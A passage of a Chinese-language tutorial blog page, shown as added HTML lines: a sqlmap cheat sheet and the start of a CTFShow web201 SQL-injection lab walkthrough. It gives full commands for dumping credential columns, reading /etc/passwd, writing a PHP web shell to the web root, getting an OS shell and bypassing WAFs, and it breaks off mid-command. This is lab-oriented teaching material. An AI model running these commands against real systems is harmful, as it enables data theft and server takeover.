+<td><code>--tables</code></td>
+<td>列出库里面的表</td>
+</tr>
+<tr>
+<td><code>--columns</code></td>
+<td>列出表里面的字段</td>
+</tr>
+<tr>
+<td><code>--schema</code></td>
+<td>导出库结构</td>
+</tr>
+<tr>
+<td><code>--count</code></td>
+<td>统计表行数</td>
+</tr>
+<tr>
+<td><code>--dump</code></td>
+<td>导出表数据</td>
+</tr>
+<tr>
+<td><code>--dump-all</code></td>
+<td>导出全部库表（真实环境慎用）</td>
+</tr>
+<tr>
+<td><code>--search</code></td>
+<td>搜索表名 &#x2F; 字段名</td>
+</tr>
+<tr>
+<td><code>-D DB</code></td>
+<td>指定数据库</td>
+</tr>
+<tr>
+<td><code>-T TBL</code></td>
+<td>指定表</td>
+</tr>
+<tr>
+<td><code>-C COL</code></td>
+<td>指定字段</td>
+</tr>
+<tr>
+<td><code>--exclude-sysdbs</code></td>
+<td>排除系统库</td>
+</tr>
+<tr>
+<td><code>--where</code></td>
+<td>导出时加 where 条件</td>
+</tr>
+<tr>
+<td><code>--start / --stop</code></td>
+<td>限制导出行范围</td>
+</tr>
+<tr>
+<td><code>--first / --last</code></td>
+<td>限制猜解字符范围</td>
+</tr>
+<tr>
+<td><code>--sql-query</code></td>
+<td>执行自定义 SQL 语句</td>
+</tr>
+<tr>
+<td><code>--sql-shell</code></td>
+<td>交互式 SQL 终端</td>
+</tr>
+<tr>
+<td><code>--sql-file</code></td>
+<td>批量执行 sql 文件</td>
+</tr>
+</tbody></table>
+<h2 id="暴力破解选项"><a href="#暴力破解选项" class="headerlink" title="暴力破解选项"></a>暴力破解选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--common-tables</code></td>
+<td>使用内置字典猜表名</td>
+</tr>
+<tr>
+<td><code>--common-columns</code></td>
+<td>使用内置字典猜字段名</td>
+</tr>
+</tbody></table>
+<h2 id="文件系统访问（需要高权限）"><a href="#文件系统访问（需要高权限）" class="headerlink" title="文件系统访问（需要高权限）"></a>文件系统访问（需要高权限）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--file-read=路径</code></td>
+<td>读取服务器文件</td>
+</tr>
+<tr>
+<td><code>--file-write=本地文件</code></td>
+<td>准备上传的本地文件</td>
+</tr>
+<tr>
+<td><code>--file-dest=远程路径</code></td>
+<td>服务器写入绝对路径</td>
+</tr>
+</tbody></table>
+<h2 id="操作系统访问（需要-DBA-权限）"><a href="#操作系统访问（需要-DBA-权限）" class="headerlink" title="操作系统访问（需要 DBA 权限）"></a>操作系统访问（需要 DBA 权限）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--os-cmd=命令</code></td>
+<td>执行单条系统命令</td>
+</tr>
+<tr>
+<td><code>--os-shell</code></td>
+<td>获取交互式系统 shell</td>
+</tr>
+<tr>
+<td><code>--os-pwn</code></td>
+<td>OOB 配合 msf 拿 shell</td>
+</tr>
+<tr>
+<td><code>--priv-esc</code></td>
+<td>尝试数据库账号提权</td>
+</tr>
+<tr>
+<td><code>--web-root</code></td>
+<td>网站根目录，辅助 os-shell</td>
+</tr>
+</tbody></table>
+<h2 id="Windows-注册表选项"><a href="#Windows-注册表选项" class="headerlink" title="Windows 注册表选项"></a>Windows 注册表选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--reg-read</code></td>
+<td>读取注册表</td>
+</tr>
+<tr>
+<td><code>--reg-add</code></td>
+<td>写入注册表</td>
+</tr>
+<tr>
+<td><code>--reg-del</code></td>
+<td>删除注册表键值</td>
+</tr>
+</tbody></table>
+<h2 id="公共通用选项（高频）"><a href="#公共通用选项（高频）" class="headerlink" title="公共通用选项（高频）"></a>公共通用选项（高频）</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s 文件</code></td>
+<td>指定会话文件</td>
+</tr>
+<tr>
+<td><code>-t 文件</code></td>
+<td>保存全部 HTTP 流量日志</td>
+</tr>
+<tr>
+<td><code>--batch</code></td>
+<td>自动确认交互，无人值守，新手必学</td>
+</tr>
+<tr>
+<td><code>--answers</code></td>
+<td>预设交互回答</td>
+</tr>
+<tr>
+<td><code>--crawl=深度</code></td>
+<td>爬虫爬页面找注入点</td>
+</tr>
+<tr>
+<td><code>--forms</code></td>
+<td>自动抓取页面表单</td>
+</tr>
+<tr>
+<td><code>--flush-session</code></td>
+<td>清空旧会话缓存，重新探测</td>
+</tr>
+<tr>
+<td><code>--fresh-queries</code></td>
+<td>忽略缓存，重新查询数据</td>
+</tr>
+<tr>
+<td><code>--har=文件</code></td>
+<td>导出 HAR 流量包</td>
+</tr>
+<tr>
+<td><code>--output-dir=路径</code></td>
+<td>自定义输出目录</td>
+</tr>
+<tr>
+<td><code>--parse-errors</code></td>
+<td>打印数据库原生报错</td>
+</tr>
+<tr>
+<td><code>--save=ini</code></td>
+<td>保存命令配置</td>
+</tr>
+<tr>
+<td><code>--scope=正则</code></td>
+<td>配合 burp 日志筛选目标</td>
+</tr>
+<tr>
+<td><code>--dump-format</code></td>
+<td>导出格式 CSV&#x2F;HTML&#x2F;SQLITE</td>
+</tr>
+</tbody></table>
+<h2 id="其他辅助选项"><a href="#其他辅助选项" class="headerlink" title="其他辅助选项"></a>其他辅助选项</h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-z 助记符</code></td>
+<td>简写助记，例如 <code>-z &quot;flu,bat&quot;</code> &#x3D; <code>--flush-session --batch</code></td>
+</tr>
+<tr>
+<td><code>--beep</code></td>
+<td>检测到注入时蜂鸣提醒</td>
+</tr>
+<tr>
+<td><code>--cleanup</code></td>
+<td>清理 sqlmap 遗留 UDF、临时表</td>
+</tr>
+<tr>
+<td><code>--list-tampers</code></td>
+<td>列出所有 tamper 脚本</td>
+</tr>
+<tr>
+<td><code>--mobile</code></td>
+<td>使用移动端 UA</td>
+</tr>
+<tr>
+<td><code>--offline</code></td>
+<td>离线模式，只读取本地会话</td>
+</tr>
+<tr>
+<td><code>--update</code></td>
+<td>更新 sqlmap</td>
+</tr>
+<tr>
+<td><code>--wizard</code></td>
+<td>向导模式，一步一步引导新手探测</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="七段标准实操流程"><a href="#七段标准实操流程" class="headerlink" title="七段标准实操流程"></a>七段标准实操流程</h1><blockquote>
+<p>最简主线命令，靶场 80% 场景够用：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ① 装载探测</span></span><br><span class="line">sqlmap -r req.txt --batch --flush-session</span><br><span class="line"><span class="comment"># ② 指纹权限画像</span></span><br><span class="line">sqlmap -r req.txt --batch -b --current-user --current-db --is-dba</span><br><span class="line"><span class="comment"># ③ 枚举库/表/字段</span></span><br><span class="line">sqlmap -r req.txt --batch --dbs</span><br><span class="line">sqlmap -r req.txt --batch -D appdb --tables</span><br><span class="line">sqlmap -r req.txt --batch -D appdb -T <span class="built_in">users</span> --columns</span><br><span class="line"><span class="comment"># ④ 精准导出数据（禁止直接 --dump-all）</span></span><br><span class="line">sqlmap -r req.txt --batch -D appdb -T <span class="built_in">users</span> -C username,password --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="装载目标：选择输入源"><a href="#装载目标：选择输入源" class="headerlink" title="装载目标：选择输入源"></a>装载目标：选择输入源</h2><blockquote>
+<p>推荐先 <code>-r req.txt</code>，Burp 抓包直接保存，Cookie、请求头、JSON 全部自动带上，不用手动填一堆参数。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>命令</th>
+<th>适用场景</th>
+<th>新手提示</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>请求文件（首选）</td>
+<td><code>sqlmap -r req.txt</code></td>
+<td>Burp 导出原始包</td>
+<td>JSON、Cookie 复杂请求首选</td>
+</tr>
+<tr>
+<td>URL GET</td>
+<td><code>sqlmap -u &quot;http://xxx?id=1&quot;</code></td>
+<td>简单 GET 参数</td>
+<td>最简单，但缺少上下文</td>
+</tr>
+<tr>
+<td>Burp 日志批量</td>
+<td><code>sqlmap -l burp.log --scope=&#39;regex&#39;</code></td>
+<td>批量筛选目标</td>
+<td>后期批量测试用</td>
+</tr>
+<tr>
+<td>自动解析表单</td>
+<td><code>sqlmap -u &lt;url&gt; --forms</code></td>
+<td>自动抓取页面 form 表单</td>
+<td>不会抓包的时候用</td>
+</tr>
+<tr>
+<td>爬虫发现入口</td>
+<td><code>sqlmap -u &lt;url&gt; --crawl=2</code></td>
+<td>自动爬页面找参数</td>
+<td>适合入门小站点</td>
+</tr>
+<tr>
+<td>挖掘隐藏参数</td>
+<td><code>sqlmap -u &lt;url&gt; --mine-params?</code></td>
+<td>探测页面未显式携带的 GET 参数</td>
+<td>进阶（非 sqlmap 原生）</td>
+</tr>
+<tr>
+<td>OpenAPI 导入</td>
+<td><code>--openapi=api.json</code></td>
+<td>从 Swagger 接口文档生成目标</td>
+<td>进阶（xray 等工具的能力）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><code>--mine-params</code>、<code>--openapi</code> 是 <strong>xray</strong> 的参数，不是 <code>sqlmap</code> 的参数；</p>
+<p><code>sqlmap</code> 里想 “挖隐藏参数” 通常靠 <code>--crawl</code>（爬行）+ <code>--forms</code>（表单）+ Burp 抓包补参，或直接用 Arjun 跑参名字典。上表前 5 行才是纯 <code>sqlmap</code> 的常用入口。</p>
+</blockquote>
+<p>定点筛选参数：</p>
+<ul>
+<li><code>-p &quot;id,name&quot;</code>：仅测试指定参数</li>
+<li><code>--skip=csrf</code>：跳过指定参数</li>
+<li><code>--param-exclude=&#39;^(utm_|_t$)&#39;</code>：正则排除参数</li>
+<li><code>--param-filter=&#39;GET&#39;</code>：按请求位置筛选参数</li>
+</ul>
+<blockquote>
+<p><code>-u</code> 默认只处理 GET；JSON 请求优先 <code>-r</code>；<code>--data</code>传 JSON POST 要手动加 <code>--headers=&quot;Content-Type: application/json&quot;</code>；<code>--data</code>默认 POST，其他请求方法搭配 <code>--method</code>。</p>
+</blockquote>
+<h2 id="请求对齐：发包和浏览器保持一致（排错高发段）"><a href="#请求对齐：发包和浏览器保持一致（排错高发段）" class="headerlink" title="请求对齐：发包和浏览器保持一致（排错高发段）"></a>请求对齐：发包和浏览器保持一致（排错高发段）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--cookie=<span class="string">&quot;PHPSESSID=xxx&quot;</span></span><br><span class="line">--headers=<span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span></span><br><span class="line">-A <span class="string">&quot;Mozilla/5.0&quot;</span>          <span class="comment"># 固定UA；--random-agent 随机UA</span></span><br><span class="line">--csrf-token=token --csrf-url=&lt;表单页&gt;  <span class="comment"># 自动获取CSRF令牌</span></span><br><span class="line">--<span class="built_in">eval</span>=<span class="string">&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span></span><br><span class="line">--proxy=http://127.0.0.1:8080 <span class="comment"># 流量转发到Burp看包，排错神器</span></span><br><span class="line">--delay=1 --<span class="built_in">timeout</span>=10 --retries=2 <span class="comment"># 保命三件套，防止封IP</span></span><br><span class="line">--safe-url=&lt;首页&gt; --safe-freq=20 <span class="comment"># 间隔访问首页，防止会话掉线</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>新手排错手段：<code>-v 3</code>，查看 <code>sqlmap</code> 真实发送数据包，对比 Burp 里浏览器的包，很多时候不是没有注入，是发包缺 Cookie、头不对。</p>
+</blockquote>
+<h2 id="探测与判定：先轻后重-判空校准"><a href="#探测与判定：先轻后重-判空校准" class="headerlink" title="探测与判定：先轻后重 + 判空校准"></a>探测与判定：先轻后重 + 判空校准</h2><p>默认配置：<code>--level=1 --risk=1 --technique=BEUSTQ</code>，<strong>不要上来直接拉满 level&#x3D;5 risk&#x3D;3</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>新手使用建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--level 1~5</code></td>
+<td>探测广度：1 默认 (GET&#x2F;POST)；2 增加 Cookie；3 增加 UA&#x2F;Referer；4-5 大量 Payload 变体</td>
+<td>靶场一般 1~3 足够</td>
+</tr>
+<tr>
+<td><code>--risk 1~3</code></td>
+<td>风险等级：1 只读安全；2 加重延时盲注；3 包含 OR 类 Payload，可能修改数据</td>
+<td>永远不要随便用 3</td>
+</tr>
+<tr>
+<td><code>--technique</code></td>
+<td>限定注入类型，降噪提速</td>
+<td>有回显优先 <code>--technique=U</code>；无回显用 <code>--technique=T</code></td>
+</tr>
+<tr>
+<td><code>--smart</code></td>
+<td>启发式过滤，只对疑似注入点深度测试</td>
+<td>批量扫描降噪</td>
+</tr>
+<tr>
+<td><code>--time-sec</code></td>
+<td>盲注延时时间，默认 5s</td>
+<td>网络卡的时候调到 7~10</td>
+</tr>
+<tr>
+<td><code>--proof</code>（1.10 新）</td>
+<td>输出可用于报告的注入证明 Payload</td>
+<td>写漏洞报告用</td>
+</tr>
+<tr>
+<td><code>--tamper</code></td>
+<td>Payload 变形绕过简单 WAF，内置 84 个脚本</td>
+<td>靶场一般不用，被 WAF 拦截再试</td>
+</tr>
+</tbody></table>
+<p>判空校准（页面内容一直在变、动态页面，容易误判，这一组参数用来校准判断依据）： <code>--string / --not-string / --regexp / --code=200 / --text-only / --titles / --lengths</code></p>
+<p>假阴性排查顺序： <code>--flush-session</code> → 调高<code>--level</code> → 更换<code>--technique</code> → 搭配<code>--tamper</code>；还是不行，就是目标有拦截，不要无限反复跑。</p>
+<blockquote>
+<p>WAF 识别已经内置自动化，<code>--identify-waf</code> 废弃，不需要手动调用。</p>
+</blockquote>
+<h2 id="指纹与权限画像：判断你能拿到多少权限"><a href="#指纹与权限画像：判断你能拿到多少权限" class="headerlink" title="指纹与权限画像：判断你能拿到多少权限"></a>指纹与权限画像：判断你能拿到多少权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-b / --banner          <span class="comment"># 获取数据库版本</span></span><br><span class="line">-f / --fingerprint     <span class="comment"># 深度指纹识别</span></span><br><span class="line">--current-user --current-db --hostname</span><br><span class="line">--is-dba               <span class="comment"># 是否DBA管理员，决定能不能拿os-shell</span></span><br><span class="line">--privileges --roles --<span class="built_in">users</span> --passwords</span><br><span class="line">--dbms=mysql           <span class="comment"># 强制指定数据库，指纹识别出错时使用</span></span><br><span class="line">--parse-errors         <span class="comment"># 抓取数据库原生报错详情</span></span><br><span class="line">--os=windows           <span class="comment"># 强制指定后端操作系统</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>判断链路：<br>DBA + 文件读写权限 → <code>--file-read</code>&#x2F;<code>--file-write</code><br>DBA + 堆叠 S 支持 → <code>--os-shell</code><br>普通账号只有 SELECT 权限 → 只能老老实实枚举库表数据</p>
+</blockquote>
+<h2 id="枚举：精准优先，拒绝全量爆破"><a href="#枚举：精准优先，拒绝全量爆破" class="headerlink" title="枚举：精准优先，拒绝全量爆破"></a>枚举：精准优先，拒绝全量爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--dbs                                 <span class="comment"># 查询所有库</span></span><br><span class="line">-D appdb --tables                     <span class="comment"># 指定库查所有表</span></span><br><span class="line">-D appdb -T <span class="built_in">users</span> --columns           <span class="comment"># 指定库表查字段</span></span><br><span class="line">-D appdb -T <span class="built_in">users</span> -C u,p --dump       <span class="comment"># 指定字段导出数据</span></span><br><span class="line">--count -D appdb -T <span class="built_in">users</span>             <span class="comment"># 只统计表行数</span></span><br><span class="line">--search -C pass                      <span class="comment"># 在全库搜索名字含pass的字段</span></span><br><span class="line">--exclude-sysdbs                      <span class="comment"># 过滤系统库</span></span><br><span class="line">--<span class="built_in">where</span>=<span class="string">&quot;id&gt;100&quot;</span> --start=0 --stop=50  <span class="comment"># 限定查询行范围</span></span><br><span class="line">--first=1 --last=20                   <span class="comment"># 限制字符截取区间</span></span><br><span class="line">--dump-format=CSV|HTML|SQL            <span class="comment"># 修改导出文件格式</span></span><br></pre></td></tr></table></figure>
+
+<p>避雷：真实测试环境不要用 <code>-a</code>、<code>--dump-all</code>，流量巨大，日志爆炸。</p>
+<p>缓存坑：<code>sqlmap</code> 会缓存探测结果；改了 tamper、参数之后旧结果不会自动刷新。</p>
+<ul>
+<li><code>--fresh-queries</code>：重新查询数据</li>
+<li><code>--flush-session</code>：清空全部会话记录，重新探测</li>
+</ul>
+<h2 id="高阶利用（必须-DBA-权限，门槛高，先了解，不要一上来就冲-shell）"><a href="#高阶利用（必须-DBA-权限，门槛高，先了解，不要一上来就冲-shell）" class="headerlink" title="高阶利用（必须 DBA 权限，门槛高，先了解，不要一上来就冲 shell）"></a>高阶利用（必须 DBA 权限，门槛高，先了解，不要一上来就冲 shell）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--sql-query=<span class="string">&quot;SELECT ...&quot;</span>     <span class="comment"># 执行单条SQL语句</span></span><br><span class="line">--sql-shell                  <span class="comment"># 交互式SQL终端（推荐先玩这个）</span></span><br><span class="line">--sql-file=cmds.sql          <span class="comment"># 批量执行SQL文件</span></span><br><span class="line">--file-read=/etc/passwd      <span class="comment"># 读取服务器文件</span></span><br><span class="line">--file-write=shell.php --file-dest=/var/www/html/shell.php [--web-root=/var/www/html] <span class="comment"># 写入文件</span></span><br><span class="line">--os-cmd=<span class="string">&quot;id&quot;</span>                <span class="comment"># 执行单条系统命令</span></span><br><span class="line">--os-shell                   <span class="comment"># 获取交互式系统Shell（依赖堆叠注入S）</span></span><br><span class="line">--os-pwn                     <span class="comment"># OOB配合Metasploit</span></span><br><span class="line">--reg-read / --reg-add / --reg-del   <span class="comment"># Windows注册表操作</span></span><br><span class="line">--priv-esc                   <span class="comment"># 尝试数据库进程提权</span></span><br><span class="line">--cleanup                    <span class="comment"># 清理sqlmap遗留UDF、临时表痕迹</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>重点提醒：MySQL 环境 <code>os-shell</code> 成功率很低，受 <code>secure_file_priv</code>、网站物理路径、目录写入权限三重限制；MSSQL 堆叠更容易拿到命令执行权限。建议先在靶场尝试 <code>--sql-shell</code>，更容易成功。</p>
+</blockquote>
+<h2 id="持久化与会话：sqlmap-是有状态工具"><a href="#持久化与会话：sqlmap-是有状态工具" class="headerlink" title="持久化与会话：sqlmap 是有状态工具"></a>持久化与会话：sqlmap 是有状态工具</h2><p>默认会话、日志、导出数据存放路径：<code>~/.sqlmap/output//</code></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>新手理解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-s file</code></td>
+<td>自定义会话文件</td>
+<td>保存探测记录，下次接着跑</td>
+</tr>
+<tr>
+<td><code>--output-dir=DIR</code></td>
+<td>自定义输出根目录</td>
+<td>改导出文件位置</td>
+</tr>
+<tr>
+<td><code>-t traffic.log / --har=x.har</code></td>
+<td>保存完整 HTTP 流量</td>
+<td>取证、复盘发包</td>
+</tr>
+<tr>
+<td><code>--dump-file=x.csv / --report-json=x.json</code>（1.10）</td>
+<td>自定义导出、JSON 报告</td>
+<td>导出结构化报告</td>
+</tr>
+<tr>
+<td><code>--save=cfg.ini → -c cfg.ini</code></td>
+<td>保存配置文件</td>
+<td>一长串命令存成配置，一键复用</td>
+</tr>
+<tr>
+<td><code>--batch / --answers / -z &quot;flu,bat&quot;</code></td>
+<td>无人值守自动应答</td>
+<td>写脚本批量跑的时候用</td>
+</tr>
+<tr>
+<td><code>-m bulk.txt</code></td>
+<td>批量多目标扫描</td>
+<td>批量 url</td>
+</tr>
+<tr>
+<td><code>sqlmapapi.py -s</code></td>
+<td>启动 REST 接口</td>
+<td>代码调用 sqlmap，进阶</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>最高频排错参数：<code>--flush-session</code>，怀疑结果不对、缓存污染，优先加上。</p>
+</blockquote>
+<h2 id="附录：sqlmap1-10-新增非-SQLi-检测面（独立引擎，后期接触）"><a href="#附录：sqlmap1-10-新增非-SQLi-检测面（独立引擎，后期接触）" class="headerlink" title="附录：sqlmap1.10 新增非 SQLi 检测面（独立引擎，后期接触）"></a>附录：sqlmap1.10 新增非 SQLi 检测面（独立引擎，后期接触）</h2><p><code>sqlmap 1.10</code> 拓展多种注入检测，不再局限 SQL 注入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--nosql    <span class="comment"># NoSQL注入</span></span><br><span class="line">--ssti     <span class="comment"># SSTI模板注入</span></span><br><span class="line">--graphql  <span class="comment"># GraphQL注入</span></span><br><span class="line">--jwt      <span class="comment"># JWT检测</span></span><br><span class="line">--ldap     <span class="comment"># LDAP注入</span></span><br><span class="line">--xpath    <span class="comment"># XPath注入</span></span><br><span class="line">--xslt     <span class="comment"># XSLT注入</span></span><br><span class="line">--xxe      <span class="comment"># XXE检测（支持--oob-server / --oob-token）</span></span><br><span class="line">--hql      <span class="comment"># HQL注入</span></span><br><span class="line">--sparql   <span class="comment"># SPARQL注入</span></span><br><span class="line">--odata    <span class="comment"># OData注入</span></span><br></pre></td></tr></table></figure>
+
+<p>新增引擎：</p>
+<ul>
+<li><code>--esperanto</code>：数据库无关枚举引擎</li>
+<li><code>--timeless / --multi-bit</code>：HTTP&#x2F;2 计时盲注、多点盲注加速</li>
+</ul>
+<blockquote>
+<p>建议先把 SQL 注入练熟，靶场验证这些新特性，不要直接上正式测试环境。</p>
+</blockquote>
+<h2 id="高频速记-12-条命令"><a href="#高频速记-12-条命令" class="headerlink" title="高频速记 12 条命令"></a>高频速记 12 条命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req.txt --batch --flush-session                    <span class="comment"># 标准起手</span></span><br><span class="line">sqlmap -r req.txt --batch -b --current-user --is-dba         <span class="comment"># 权限画像</span></span><br><span class="line">sqlmap -r req.txt --batch --dbs                              <span class="comment"># 列出所有库</span></span><br><span class="line">sqlmap -r req.txt --batch -D d -T t -C a,b --dump            <span class="comment"># 指定字段导出</span></span><br><span class="line">sqlmap -r req.txt --batch --technique=U                      <span class="comment"># 只测联合注入</span></span><br><span class="line">sqlmap -r req.txt --batch --level=3 --risk=1                 <span class="comment"># 扩大探测范围（Cookie/UA）</span></span><br><span class="line">sqlmap -r req.txt --batch --tamper=space2comment,between     <span class="comment"># 基础WAF绕过链</span></span><br><span class="line">sqlmap -r req.txt --batch --delay=1 --<span class="built_in">timeout</span>=10 --retries=2 <span class="comment"># 风控保命参数</span></span><br><span class="line">sqlmap -r req.txt --batch --fresh-queries                    <span class="comment"># 清除查询缓存</span></span><br><span class="line">sqlmap -r req.txt --batch --sql-query=<span class="string">&quot;SELECT @@version&quot;</span>     <span class="comment"># 自定义SQL查询</span></span><br><span class="line">sqlmap -r req.txt --batch --file-read=/etc/passwd            <span class="comment"># 文件读取</span></span><br><span class="line">sqlmap -r req.txt --batch -v 3                               <span class="comment"># 查看发包排错</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="CTFShow练习"><a href="#CTFShow练习" class="headerlink" title="CTFShow练习"></a>CTFShow练习</h1><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
+<li>使用<code>--user-agent</code> 指定<code>agent</code> </li>
+<li>使用<code>--referer</code> 绕过<code>referer</code>检查</li>
+<li>后端：<code>select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;$_GET[id]&#39;;</code></li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键前置条件（注入点）：页面表单实际请求的是 <code>GET /api/?id=</code>（不是 <code>/sqlmap.php?id=</code>），在前端<code>js</code>里就可以读出来，可以直接硬看<code>js</code>，但推荐用以下步骤：</p>
+<ol>
+<li>浏览器打开页面，F12 → <code>Network</code> → 勾 <code>Preserve log</code></li>
+<li>写个数字，点一次“查询”按钮</li>
+<li>找到那条 XHR（本题是 <code>api/?id=1</code>），右键 → <code>Copy</code> → <code>Copy as cURL</code></li>
+<li>存成 <code>req.txt</code>，注意两点：<ul>
+<li>本题要把 <code>User-Agent</code> 改成含 <code>sqlmap</code> 的（浏览器 UA 会被 WAF 拒）</li>
+<li><code>Referer</code> 保留 <code>https://ctf.show/</code></li>
+</ul>
+</li>
+<li>直接喂给 <code>sqlmap</code>： <code>sqlmap -r req.txt --batch --dbs</code></li>
+</ol>
+<blockquote>
+<p>为什么优先 -r 而不是 -u：-r 把 <code>Cookie</code>、<code>Referer</code>、<code>Content-Type</code>、<code>JSON body</code>、自定义 <code>Header</code><br>全部原样带上，而入口发现阶段最容易出错的就是“少带了一个头”。</p>
+<p>本题就是例子：<code>-u</code> 能跑通，但前提是你手工补齐了 <code>Referer</code>；换一道依赖 <code>Cookie/CSRF token</code> 的题，<code>-r</code> 几乎不用补任何东西。</p>
+</blockquote>
+<ol start="6">
+<li>总结：入口发现推荐顺序，成本从低到高</li>
+</ol>
+<blockquote>
+<p> 看 HTML 源码（<code>grep action/input</code>）<br>  → 看 JS（<code>grep url/fetch/ajax</code>）<br>     → F12 <code>Network</code> 点交互<br>        → 抓包工具记录<br>           → 爬虫批量扫</p>
+</blockquote>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这里<strong>为了方便就不存成<code>txt</code>文件了</strong>，做题直接跑命令测就行了。</p>
+<blockquote>
+<p><code>sqlmap</code> 默认 UA 本身是 <code>sqlmap/1.10.10#stable (https://sqlmap.org)</code>，所以不用额外加 <code>--user-agent</code>，只补 <code>--referer</code> 就能过。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0) 可选：先看注入点的原始行为（手工布尔对）</span></span><br><span class="line">curl -skS -A <span class="string">&quot;sqlmap/1.10.10#stable (https://sqlmap.org)&quot;</span> -e <span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --get --data-urlencode <span class="string">&quot;id=1&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 探测 (判断可用哪种注入) </span></span><br><span class="line">  sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 列库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;https://3c54d2f8-f3ac-4482-bc23-7be9f3ecbf14.challenge.ctf.show/api/?id=1&quot;</span> \</span><br><span class="line">  --referer=<span class="string">&quot;https://ctf.show/&quot;</span> \</span><br><span class="line">  --batch --dbs </span><br><span class="line"></span><br><span class="line"><span class="comment"># 